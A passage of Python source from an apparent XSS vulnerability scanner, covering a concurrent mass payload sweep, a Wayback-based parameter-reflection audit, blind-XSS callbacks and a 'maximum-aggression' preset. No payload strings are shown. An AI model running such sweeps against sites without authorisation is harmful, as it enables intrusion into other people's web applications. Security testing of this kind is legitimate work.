        max_response_bytes=getattr(args, "max_response_bytes", 5 * 1024 * 1024),
    )
    custom_params = [
        item.strip()
        for item in str(getattr(args, "mass_params", "") or "").split(",")
        if item.strip()
    ]
    fallback_params = custom_params or list(MASS_PARAMETERS)
    payload_budget = max(1, int(getattr(args, "mass_payloads", 4) or 4))
    templates = list(MASS_PAYLOADS)[:payload_budget]
    if len(templates) < payload_budget:
        templates.extend(engine.payloads_for("generic", limit=payload_budget - len(templates)))
    templates = list(dict.fromkeys(templates))

    jsonl_path = getattr(args, "jsonl", None)
    jsonl_handle = None
    if jsonl_path:
        try:
            Path(jsonl_path).parent.mkdir(parents=True, exist_ok=True)
            jsonl_handle = open(jsonl_path, "a", encoding="utf-8")
        except OSError as exc:
            console.error(f"Cannot write JSONL output {jsonl_path}: {exc}")
            return 1, 0

    actionable = 0
    lock = asyncio.Lock()

    def emit(finding: Finding) -> None:
        nonlocal actionable
        stats.findings += 1
        if finding.confidence in ("confirmed", "high"):
            actionable += 1
        if jsonl_handle is not None:
            jsonl_handle.write(json.dumps(finding.to_dict(), ensure_ascii=False) + "\n")
            jsonl_handle.flush()

    async def sweep(url: str) -> None:
        if not re.match(r"^https?://", url, re.IGNORECASE):
            url = "http://" + url
        parts = urlsplit(url)
        params = [name for name, _value in parse_qsl(parts.query, keep_blank_values=True)]
        if not params:
            params = fallback_params[:6]
        for param in dict.fromkeys(params):
            for template in templates:
                token = unique_token("m", 8)
                payload = engine.render(template, token, "html")
                payload = apply_tamper(payload, getattr(args, "tamper", None))
                chain = getattr(args, "encoder", None) or []
                if chain and HAS_RECON and apply_encoder_chain is not None:
                    payload = apply_encoder_chain(payload, chain)
                probe_url = replace_query_param(url, param, payload)
                response = await http.get(probe_url, cache=False)
                if response.error or not response.text:
                    continue
                info = analyze_reflection(
                    response.text, token, payload, response.header("content-type", "")
                )
                if not info.reflected or not info.executable:
                    continue
                finding = Finding(
                    kind="Reflected XSS (HTTP evidence)",
                    url=probe_url,
                    parameter=param,
                    method="GET",
                    payload=payload,
                    evidence=f"marker reflected unescaped ({info.detail})",
                    confidence="high",
                    context=info.context,
                    detail="mass mode: browser confirmation not attempted",
                    tags=["mass"],
                    subkey=param,
                )
                async with lock:
                    console.finding(finding)
                    emit(finding)
                break

    try:
        await http.start()
        semaphore = asyncio.Semaphore(max(1, args.concurrency))

        async def worker(target: str) -> None:
            async with semaphore:
                try:
                    await sweep(target)
                except asyncio.CancelledError:
                    raise
                except Exception as exc:
                    console.debug(f"mass: {target}: {exc}")
                finally:
                    stats.urls_done += 1
                    if stats.urls_done % 500 == 0:
                        console.info(
                            f"mass: {stats.urls_done}/{len(targets)} URLs, "
                            f"{stats.findings} finding(s)",
                            important=False,
                        )

        await asyncio.gather(*(worker(target) for target in targets))
        console.info(
            f"mass complete: {stats.urls_done} URL(s), {stats.requests} request(s), "
            f"{actionable} actionable finding(s)",
            important=True,
        )
    finally:
        await http.close()
        if jsonl_handle is not None:
            jsonl_handle.close()
    return 0, actionable


async def run_param_audit(args: argparse.Namespace, console: Console) -> Tuple[int, int]:
    """Collect candidate parameters (collector style) and probe reflection (Gxss style).

    This mode is intentionally independent from the full scanner: it performs no
    crawling, browser work, payload download or checkpointing.  It harvests URLs
    from Wayback (or an input file), extracts parameter names, then substitutes a
    unique marker into exactly one parameter per request and checks the response.
    """
    if not HAS_PARAM_AUDIT:
        console.error(
            "Parameter-audit modules failed to import: "
            + str(globals().get("_PARAM_IMPORT_ERROR", "unknown error"))
        )
        return 1, 0

    targets = gather_targets(args, console)
    if targets is None:
        return 1, 0
    if not targets:
        console.error("No target supplied. Run with --help for usage.")
        return 1, 0

    stats = ScanStats(urls_total=len(targets))
    http = HttpEngine(
        console,
        stats,
        headers=XSSScanner._parse_headers(args.headers),
        cookies=XSSScanner._parse_cookies(args.cookies),
        timeout=args.timeout,
        retries=args.retries,
        rate=args.rate_limit,
        concurrency=args.concurrency,
        proxy=args.proxy,
        insecure=args.insecure,
        redirect_scope=lambda candidate: any(
            Scope(target, args.allow_subdomains, args.include, args.exclude).in_scope(candidate)
            for target in targets
        ),
        max_response_bytes=getattr(args, "max_response_bytes", 5 * 1024 * 1024),
    )
    harvester = ParameterHarvester(
        http, console, limit=max(1, args.param_limit), timeout=max(10.0, args.timeout * 2)
    )
    probe = ReflectionProbe(
        http,
        console,
        marker=args.param_marker,
        concurrency=max(1, args.concurrency),
    )

    seed_urls: List[str] = []
    source_errors: List[str] = []
    source = args.param_source or (
        "none" if (args.param_input or args.param_data) else "wayback"
    )
    if source in ("passive", "both") and not HAS_RECON:
        console.warn("Passive URL collection is unavailable; scanning the supplied targets only")
        source = "wayback" if source == "both" else "none"
    try:
        if args.param_input:
            try:
                with open(args.param_input, "r", encoding="utf-8-sig", errors="replace") as handle:
                    for line in handle:
                        line = line.strip()
                        if line and not line.startswith("#"):
                            seed_urls.append(line)
            except OSError as exc:
                console.error(f"Cannot read --param-input {args.param_input}: {exc}")
                return 1, 0

        for target in targets:
            candidate_target = target if target.lower().startswith(("http://", "https://")) else "http://" + target
            seed_urls.append(candidate_target)

        if source in ("wayback", "both"):
            wayback_attempted = 0
            wayback_found = 0
            for target in targets:
                host = (urlsplit(target if "://" in target else "http://" + target).hostname or "").lower()
                if not host:
                    continue
                domain = host
                if HAS_RECON and root_domain is not None:
                    try:
                        domain = root_domain(host) or host
                    except Exception:
                        domain = host
                wayback_attempted += 1
                found = await harvester.wayback(domain, include_subdomains=bool(args.param_subs))
                wayback_found += len(found)
                seed_urls.extend(found)
            if wayback_attempted and not wayback_found:
                console.warn(
                    "Wayback returned no URLs for the target, or the CDX API is unavailable; "
                    "use --param-input with a URL list to audit offline."
                )

        if source in ("passive", "both") and HAS_RECON and PassiveURLCollector is not None:
            for target in targets:
                host = (urlsplit(target if "://" in target else "http://" + target).hostname or "").lower()
                if not host:
                    continue
                domain = host
                if root_domain is not None:
                    try:
                        domain = root_domain(host) or host
                    except Exception:
                        domain = host
                try:
                    collected = await PassiveURLCollector(
                        http,
                        console,
                        timeout=max(10.0, args.timeout * 2),
                        limit=max(1, args.param_limit),
                    ).collect(domain)
                    seed_urls.extend(collected.urls)
                    source_errors.extend(collected.errors)
                except Exception as exc:
                    source_errors.append(f"{domain}: {exc}"[:300])
    finally:
        await http.close()

    if args.param_data:
        # Gxss -d: test form fields from an explicit body on the first seed.
        if not seed_urls:
            console.error("--param-data requires at least one target URL")
            return 1, 0
        try:
            pairs = parse_qsl(args.param_data, keep_blank_values=True)
        except Exception:
            pairs = []
        if not pairs:
            console.error("--param-data must be a form body such as 'user=test&pass=test'")
            return 1, 0
        report = harvester.from_pairs(seed_urls[0], pairs, source="post")
    else:
        report = harvester.harvest(seed_urls, domain="", source="audit")
    report.errors.extend(source_errors)

    if not report.candidates:
        console.warn(
            "No query parameters found. Supply URLs with parameters via --param-input, "
            "use --param-source passive, or pass a target URL with a query string."
        )
        return 0, 0

    max_checks = max(1, int(args.param_max_checks or 10000))
    candidates = report.candidates[:max_checks]
    # The HTTP engine was closed after harvesting; reopen it for the probe pass
    # so the session lifetime stays explicit and testable.
    http = HttpEngine(
        console,
        stats,
        headers=XSSScanner._parse_headers(args.headers),
        cookies=XSSScanner._parse_cookies(args.cookies),
        timeout=args.timeout,
        retries=args.retries,
        rate=args.rate_limit,
        concurrency=args.concurrency,
        proxy=args.proxy,
        insecure=args.insecure,
        redirect_scope=lambda candidate: any(
            Scope(target, args.allow_subdomains, args.include, args.exclude).in_scope(candidate)
            for target in targets
        ),
        max_response_bytes=getattr(args, "max_response_bytes", 5 * 1024 * 1024),
    )
    probe.http = http
    try:
        candidates = await probe.probe_candidates(candidates, data=args.param_data or "")
    finally:
        await http.close()

    stats.passive_urls = len(report.urls)
    stats.discovered_params = len(report.candidates)
    reflected = [candidate for candidate in candidates if candidate.reflected]
    candidates.sort(key=lambda item: (not item.reflected, -item.count, item.name))

    console.info(
        f"Parameter audit: {len(report.urls)} URL(s), {len(candidates)} parameter(s), "
        f"{len(reflected)} reflecting",
        important=True,
    )
    for candidate in candidates:
        if args.quiet and not candidate.reflected:
            continue
        if candidate.reflected:
            console.ok(
                f"reflected: {candidate.name} "
                f"(risk={candidate.risk}, hits={candidate.count}, context={candidate.context or 'unknown'})",
                important=True,
            )
        else:
            console.raw(
                f"  candidate: {candidate.name} (risk={candidate.risk}, hits={candidate.count})"
            )
        if candidate.reflected and candidate.probe_url:
            console.raw(f"      {candidate.probe_url}")
        if args.verbose and candidate.evidence:
            console.raw(f"      {candidate.evidence}")

    report_payload: Dict[str, Any] = {
        "tool": APP_NAME,
        "version": VERSION,
        "mode": "param-audit",
        "finished": datetime.now(timezone.utc).isoformat(),
        "targets": targets,
        "source": source,
        "stats": asdict(stats),
        "candidates": [candidate.to_dict() for candidate in candidates],
        "errors": report.errors,
    }
    if args.param_output:
        output_path = Path(args.param_output)
        try:
            output_path.parent.mkdir(parents=True, exist_ok=True)
            output_path.write_text(
                json.dumps(report_payload, indent=2, ensure_ascii=False) + "\n",
                encoding="utf-8",
            )
            console.info(f"Parameter audit JSON written to {output_path}", important=False)
        except OSError as exc:
            console.warn(f"Cannot write parameter audit report {output_path}: {exc}")

    if args.jsonl:
        try:
            jsonl_path = Path(args.jsonl)
            jsonl_path.parent.mkdir(parents=True, exist_ok=True)
            with open(jsonl_path, "a", encoding="utf-8") as handle:
                for candidate in candidates:
                    handle.write(json.dumps(candidate.to_dict(), ensure_ascii=False) + "\n")
            console.info(f"Parameter audit JSONL written to {jsonl_path}", important=False)
        except OSError as exc:
            console.warn(f"Cannot write parameter audit JSONL {args.jsonl}: {exc}")

    return 0, len(reflected)


async def run_targets(args: argparse.Namespace, console: Console) -> Tuple[int, int]:
    actionable = 0
    targets = gather_targets(args, console)
    if targets is None:
        return 1, 0

    if not targets:
        console.error("No target supplied. Run with --help for usage.")
        return 1, 0

    for index, target in enumerate(targets, 1):
        if len(targets) > 1:
            console.raw("")
            console.info(f"[{index}/{len(targets)}] {target}")
        scanner = XSSScanner(target, args, console)
        console.event("target_started", target=scanner.target, index=index, total=len(targets))
        try:
            findings = await scanner.run()
            # Blind injections are recorded immediately but only become real
            # findings after an out-of-band callback.  Don't let them fail CI.
            actionable += sum(1 for finding in findings if finding.confidence in ("confirmed", "high"))
        except asyncio.CancelledError:
            raise
        except Exception as exc:
            console.event("target_failed", target=scanner.target, error=f"{type(exc).__name__}: {exc}")
            console.error(f"Scan failed for {target}: {exc}")
            if args.verbose:
                console.raw(traceback.format_exc())
        finally:
            if scanner.pool is not None:
                await scanner.pool.stop()
                scanner.pool = None
            await scanner.http.close()

    return 0, actionable


def main(argv: Optional[Sequence[str]] = None) -> int:
    parser = build_parser()
    args = parser.parse_args(argv)
    raw_args = list(argv) if argv is not None else sys.argv[1:]
    explicit_flags = {token.split("=", 1)[0] for token in raw_args if token.startswith("--")}
    god_mode_requested = "--god" in explicit_flags or "--yolo" in explicit_flags
    if args.profile == "quick" and not god_mode_requested:
        if "--crawl" not in explicit_flags and "--deep" not in explicit_flags:
            args.crawl = False
        if not {"--no-browser", "--browser", "--confirm"}.intersection(explicit_flags):
            args.no_browser = True
        if "--no-remote-payloads" not in explicit_flags and "--remote-payloads" not in explicit_flags:
            args.remote_payloads = False
    elif args.profile == "deep":
        args.deep = True

    if args.no_color or os.environ.get("NO_COLOR"):
        bcolors.disable()
        if _ui is not None:
            _ui.disable()
    if args.list_payloads:
        print_payloads()
        return 0
    if args.list_tampers:
        print_tampers()
        return 0
    if getattr(args, "list_encoders", False):
        print_encoders()
        return 0

    console = Console(
        verbose=args.verbose, quiet=args.quiet, log_file=args.output,
        events_file=getattr(args, "events_jsonl", None),
    )
    if getattr(args, "doctor", False):
        return run_doctor(console, args)
    if not args.quiet:
        banner(console)

    if args.blind:
        if not re.match(r"^https?://", args.blind, re.IGNORECASE):
            console.error("--blind requires an http(s) callback URL, e.g. --blind https://xo.example")
            return 1
        console.info(
            f"Blind XSS: injecting out-of-band probes that call back to {args.blind}",
            important=False,
        )

    if getattr(args, "encoder", None):
        known = set(encoder_names()) if HAS_RECON else set()
        unknown = [name for name in args.encoder if name not in known]
        if unknown:
            console.error(
                "Unknown encoder(s): " + ", ".join(unknown) + ". Run --list-encoders."
            )
            return 1

    if getattr(args, "oob_file", None) and not (args.blind or args.interactsh):
        console.error(
            "--oob-file only reads observed callbacks; pair it with --blind <callback-url> "
            "or use --interactsh for a generated callback."
        )
        return 1

    if getattr(args, "god", False):
        raw_tokens = list(argv) if argv is not None else sys.argv[1:]
        # Normalize `--flag=value` tokens so explicit user settings claim their
        # flag (otherwise god mode would override them).
        user_flags = {
            token.split("=", 1)[0]
            for token in raw_tokens
            if token.startswith("--") and token.split("=", 1)[0] not in ("--god", "--yolo")
        }
        apply_god_preset(args, console, user_flags)
        if _ui is not None and _ui.enabled() and not console.quiet:
            diamond = _ui.glyphs()["diamond"]
            console.raw(
                f"  {bcolors.FAIL}{bcolors.BOLD}{diamond} GOD MODE ENGAGED{bcolors.ENDC}"
                f"{bcolors.DIM}  full-automatic maximum-aggression preset  "
                f"{bcolors.FAIL}{diamond}{bcolors.ENDC}"
            )
        else:
            console.info("GOD MODE engaged: full-automatic maximum-aggression preset applied", important=True)
        console.info(
            f"god preset: crawl depth {args.crawl_depth}/{args.max_urls} URLs/{args.js_files} JS files, "
            f"{args.max_payloads} payloads per point, {args.threads} workers x {args.concurrency} requests, "
            f"browser {'off (HTTP-only)' if args.no_browser else args.browser}, "
            f"OOB {'interactsh' if getattr(args, 'interactsh', None) else ('blind callback' if args.blind else 'off')}",
        )

    recon_flags = (
        getattr(args, "subdomains", False)
        or int(getattr(args, "subdomain_brute", 0) or 0) > 0
        or getattr(args, "passive_urls", False)
        or getattr(args, "openapi", False)
        or getattr(args, "fuzz_paths", False)
        or getattr(args, "mine_params", False)
        or getattr(args, "external_tools", False)
    )
    if recon_flags and not HAS_RECON:
        console.error(
            "Reconnaissance modules failed to import: " + str(globals().get("_RECON_IMPORT_ERROR", "unknown error"))
        )
        return 1

    if not HAS_AIOHTTP:
        console.error("aiohttp is required: pip install -r requirements.txt")
        return 1
    if not HAS_BS4:
        console.error("beautifulsoup4 is required: pip install -r requirements.txt")
        return 1

    if args.no_browser:
        args.confirm = "http"
    if args.threads < 1:
        args.threads = 1
    if args.concurrency < 1:
        args.concurrency = 1
    if args.max_response_bytes < 1024:
        console.warn("--max-response-bytes is below 1024; using 1024 bytes")
        args.max_response_bytes = 1024
    if args.max_payloads < 1:
        args.max_payloads = 1
    if args.crawl_depth < 1:
        args.crawl_depth = 1
    if args.max_urls < 1:
        args.max_urls = 1
    if args.js_files < 0:
        args.js_files = 0
    if args.fuzz_param_limit < 1:
        args.fuzz_param_limit = 1
    if args.subdomain_brute < 0:
        args.subdomain_brute = 0
    if args.oob_interval < 1:
        args.oob_interval = 1.0
    if args.oob_wait < 0:
        args.oob_wait = 0.0

    if args.deep:
        args.crawl = True
        args.crawl_depth = max(args.crawl_depth, 5)
        args.max_urls = max(args.max_urls, 1500)
        args.discover = True
        args.discover_paths = True
        args.fuzz_params = True

    if args.mass and getattr(args, "param_audit", False):
        console.error("--mass and --param-audit are separate modes; choose one")
        return 1

    if getattr(args, "god", False) and (args.mass or getattr(args, "param_audit", False)):
        console.error("--god is a full-scan preset; it cannot be combined with --mass or --param-audit")
        return 1

    if getattr(args, "param_audit", False):
        if not HAS_PARAM_AUDIT:
            console.error(
                "Parameter-audit modules failed to import: "
                + str(globals().get("_PARAM_IMPORT_ERROR", "unknown error"))
            )
            return 1
        console.info(
            "Parameter audit: collector-style URL harvest + Gxss-style per-parameter reflection probe",
            important=False,
        )
        install_uvloop()
        try:
            code, reflected = asyncio.run(run_param_audit(args, console))
            if args.fail_on_findings and reflected:
                code = 2
        except KeyboardInterrupt:
            console.warn("Interrupted")
            code = 130
        except Exception as exc:
            console.error(f"Fatal error: {exc}")
            if args.verbose:
                console.raw(traceback.format_exc())
            code = 1
        return code

    if args.mass and getattr(args, "param_audit", False):
        console.error("--mass and --param-audit are separate modes; choose one")
        return 1

    if getattr(args, "param_audit", False):
        if not HAS_PARAM_AUDIT:
            console.error(
                "Parameter-audit modules failed to import: "
                + str(globals().get("_PARAM_IMPORT_ERROR", "unknown error"))
            )
            return 1
        console.info(
            "Parameter audit: collector-style URL harvest + Gxss-style per-parameter reflection probe",
            important=False,
        )
        install_uvloop()
        try:
            code, reflected = asyncio.run(run_param_audit(args, console))
            if args.fail_on_findings and reflected:
                code = 2
        except KeyboardInterrupt:
            console.warn("Interrupted")
            code = 130
        except Exception as exc:
            console.error(f"Fatal error: {exc}")
            if args.verbose:
                console.raw(traceback.format_exc())
            code = 1
        return code

    if args.mass:
        if args.blind:
            console.warn("--blind is ignored in mass mode (HTTP-only sweep)")
        console.info("Mass mode: stateless HTTP sweep (no crawl, browser or reports)", important=False)
        install_uvloop()
        try:
            code, findings = asyncio.run(run_mass(args, console))
            if args.fail_on_findings and findings:
                code = 2
        except KeyboardInterrupt:
            console.warn("Interrupted")
            code = 130
        except Exception as exc:
            console.error(f"Fatal error: {exc}")
            if args.verbose:
                console.raw(traceback.format_exc())
            code = 1
        return code

    if args.jsonl and not args.mass:
        console.warn("--jsonl is only written in --mass mode; full scans use --report json")

    install_uvloop()
    payload_files: List[Path] = []
    payload_dir: Optional[Path] = None
    code = 0
    try:
        if args.remote_payloads:
            sources: List[str] = list(PAYLOAD_SOURCES)
            for extra in args.payload_source or []:
                if extra and extra not in sources:
                    sources.append(str(extra))
            payload_dir = payload_workdir(args.payload_tmp_dir)
            payload_files, payload_dir = download_payload_lists(
                console,
                sources,
                args.payload_limit,
                work_dir=payload_dir,
            )
        args.payload_files = [str(path) for path in payload_files]

        console.start_status()
        code, findings = asyncio.run(run_targets(args, console))
        if args.fail_on_findings and findings:
            code = 2
    except KeyboardInterrupt:
        console.warn("Interrupted - checkpoints were saved")
        code = 130
    except Exception as exc:
        console.error(f"Fatal error: {exc}")
        if args.verbose:
            console.raw(traceback.format_exc())
        code = 1
    finally:
        console.stop_status()
        cleanup_payload_lists(payload_dir, keep=args.keep_payloads, console=console)
    return code


if __name__ == "__main__":
    sys.exit(main())
